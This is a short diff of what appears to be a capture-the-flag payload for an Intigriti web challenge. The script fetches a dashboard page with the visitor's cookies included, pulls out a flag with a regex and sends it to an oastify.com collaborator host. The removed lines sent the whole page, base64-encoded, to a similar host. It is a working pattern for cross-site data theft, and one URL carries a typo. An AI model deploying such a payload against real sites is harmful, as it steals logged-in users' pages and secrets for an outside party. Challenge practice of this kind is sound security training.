@@ -6,8 +6,17 @@ fetch("https://challenge-0126.intigriti.io/dashboard.html", {
   credentials: "include"
 })
 .then(r => r.text())
-.then(data => {
-  fetch("https://lazecujxwitzc7yl44drt53j4aa1yumj.oastify.com/?data=" + btoa(data));
+.then(html => {
+
+  // flag text extract karo
+  const match = html.match(/INTIGRITI\{.*?\}/);
+
+  if(match){
+    fetch("https://m3qf5vcypjm058rmx56sm6wkxb32ryfn.oastify.com/?flag=" + encodeURIComponent(match[0]));
+  } else {
+    fetch("https://m3qf5vcypjm058rmx56sm6wkxb32ryfn.oastify.comD/?noflag=true");
+  }
+
 });
 </script>
 </body>
